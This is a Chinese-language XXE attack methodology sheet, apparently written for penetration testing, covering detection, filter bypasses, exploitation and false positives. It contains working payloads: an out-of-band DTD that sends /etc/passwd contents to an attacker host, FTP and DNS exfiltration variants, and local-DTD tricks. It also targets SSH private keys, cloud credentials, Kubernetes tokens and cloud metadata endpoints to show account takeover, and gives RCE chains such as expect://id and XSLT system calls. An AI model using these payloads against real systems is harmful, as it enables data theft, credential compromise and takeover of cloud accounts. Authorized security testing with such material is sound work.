## 一、漏洞确认 | 确认输入影响后端的范围

1. **XML 解析点**:哪里接收 XML?直接 XML(SOAP `text/xml`/`application/soap+xml`、REST 接 `application/xml`)/ 把 JSON POST 的 `Content-Type` 改 `application/xml` 很多后端双格式或自动探测会接 / 文件上传里 `docx·xlsx·pptx`(OOXML 是 ZIP 包 XML)、SVG(SVG 即 XML)/ RSS·Atom / SAML Response(base64 解开是 XML)/ PDF 生成器嵌的 SVG·XML / GPX·XHTML。没显式 XML 口也试 JSON→XML 改头
2. **实体支持**:外部实体开没开——先发内部实体 `<!ENTITY xxe "test">` 看 `&xxe;` 回显没(回显 = 解析器支持实体);再 `<!ENTITY xxe SYSTEM "http://dnslog/">` 看 OOB 来没(来 = 外部实体开);参数实体 `<!ENTITY % xxe ...>` 支不支持(决定 OOB 链式能不能用)
3. **回显程度**:全回显(实体值进响应正文)/ 报错回显(解析报错信息含文件内容)/ 无回显(blind,靠 OOB——dnslog dnslog.cn / ceye.io / interact.sh,或没 dnslog 时 `ssh Tfo0 'nohup python3 -m http.server 8000 >/tmp/xxe.log 2>&1 &'` 接 `http://<该机公网IP/域名>:8000/x`,FTP 外带则 Tfo0 起 `xxeserv`/自写 2121,看 `ssh Tfo0 'cat /tmp/xxe.log'`)

## 二、绕过思路

1. **拦 DOCTYPE**(禁外部实体声明):XInclude(不要 DOCTYPE,`<xi:include href="file:///etc/passwd" parse="text"/>`,Apache Cocoon/Xerces-J/libxml2 支持)/ 本地 DTD 注入(覆盖服务器本地 DTD 里已定义实体,见下「本地 DTD」)
2. **拦外部实体但留参数实体 / WAF 浅检**:参数实体链式嵌套(`<!ENTITY % a "&#x25;b;">`→外部 DTD 再展开,浅 WAF 只看第一层)/ 三段 DTD(stage1 fetch stage2、stage2 fetch stage3、stage3 才真读文件)
3. **拦出网(egress 拦外部连接)**:file:// 本地读不走外网 / 本地 DTD(本地 file:// 读,DTD 被信)/ 报错外带(不外连,文件内容进错误信息)/ DNS-only 外带(`SYSTEM "file://HASH.attacker.com"` 只走 DNS 查询泄数据,不要 HTTP)
4. **拦特定协议**(只 http):file:// / `php://filter/convert.base64-encode/resource=`(读文件且避免特殊字符)/ gopher://(访问内网 Redis·SMTP)/ `expect://`(PHP expect 扩展,RCE)/ `jar://`(Java,报错外带)
5. **回显特殊字符截断**(文件含换行/特殊字符塞不进 HTTP url):`php://filter` base64 编码读 / FTP 外带(FTP 逐行传,HTTP 外带在换行截断)/ 报错外带
6. **schema 校验**:DOCTYPE 被拦后,在 schema 校验后、实体处理前插 CDATA/注释

## 三、漏洞证明

- **文件读(核心,证读到敏感数据)**:file:// 读——Linux `/etc/passwd`、`/proc/self/environ`(环境变量含 DB 串·API key)、`/home/USER/.ssh/id_rsa`(SSH 私钥)、`/home/USER/.aws/credentials`(云钥匙)、`/var/run/secrets/kubernetes.io/serviceaccount/{token,ca.crt,namespace}`(k8s SA token,云原生凭证)、`.bash_history`、`/var/log/apache2/access.log`(url 里可能有密码);Windows `web.config`/`wp-config.php`(数据库串)、`C:\Windows\System32\drivers\etc\hosts`。读出明文凭证 = 证到危害
- **SSRF via XXE(证接管)**:`<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">` 直接请求云元数据——IMDSv2 先 `PUT /latest/api/token` 拿 token、国内云 `100.100.100.200`、Azure `169.254.169.254/metadata/instance?api-version=2021-02-01`(头 `Metadata: true`)、钥匙路径差(`cam/security-credentials/角色名` 404 再请求 `cam/service-role-security-credentials/角色名`);拿到 `TmpSecretId`+`TmpSecretKey`+`Token` 用 apikey 连接云 API(`GetCallerIdentity` 对主账号)证接管。即便实体值不回显,DOCTYPE 的 `PUBLIC`/`SYSTEM` fetch DTD 本身就触发 HTTP 请求 = 证到 SSRF
- **OOB 带外拿数据(无回显时)**:自建 DTD 外带——attacker 托管 evil.dtd:`<!ENTITY % file SYSTEM "file:///etc/passwd">` + `<!ENTITY % exfil "<!ENTITY &#x25; send SYSTEM 'http://attacker/?d=%file;'>">` + `%exfil;`;target payload `<!DOCTYPE foo [<!ENTITY % dtd SYSTEM "http://attacker/evil.dtd">%dtd;]>`;文件内容进 attacker 日志。报错外带变体:`file:///nonexistent/%file;` 让报错信息含文件内容;FTP 逐行外带(`ftp://attacker:2121/%file;`,HTTP 外带换行截断时用)
- **本地 DTD(出网全拦时的盲放大)**:外部连接全拦但 file:// 本地读通常开——覆盖服务器本地 DTD 里已定义实体:`<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">` 再重定义其中的 `ISOamso` 一类实体塞 `%file;`/报错链。常见本地 DTD 路径——Linux `/usr/share/yelp/dtd/docbookx.dtd`、`/usr/share/xml/fontconfig/fonts.dtd`、`/usr/share/sgml/docbook/xml-dtd-*/docbookx.dtd`、`/usr/share/struts/struts-config_1_0.dtd`;Windows `C:\Windows\System32\wbem\xml\cim20.dtd`(WMI);JAR 内 `jar:file:///usr/share/java/tomcat-*.jar!/javax/servlet/resources/web-app_2_3.dtd`
- **RCE 链(次级)**:`expect://id`(PHP expect 扩展)/ XSLT RCE(Xalan-J `rt:exec`、PHP `php:function('system','id')`)/ Solr CVE-2017-12629(XXE 读配置→注册 VelocityResponseWriter→模板 RCE)/ XXE→XSLT 链(目标接 `<?xml-stylesheet?>` 时实体 + 恶意 XSLT 升级到 RCE)

## 四、误报场景

- 内部实体 `<!ENTITY xxe "test">` 的 `&xxe;` 反射 = 只是模板/拼接,不算 XXE(外部实体没开)
- DOCTYPE 触发了 OOB 连接(DTD fetch 到 attacker)= 只证了 SSRF,没读到 file:// 不算 XXE 文件读
- schema 校验拦 DOCTYPE 报 400 / 禁外部实体声明(`disallow-doctype-decl`) = 解析器开了安全配置,不是漏
- 读 `/etc/passwd` 空/权限拒、云元数据 401 没拿 token = 没证到危害
- XInclude 不支持(`xi:include` 被忽略)/ 本地 DTD 路径不存在 = 这路未命中,不是洞
- 文件上传 docx·svg 被服务端重打包/清洗,实体没触发 = 不是洞
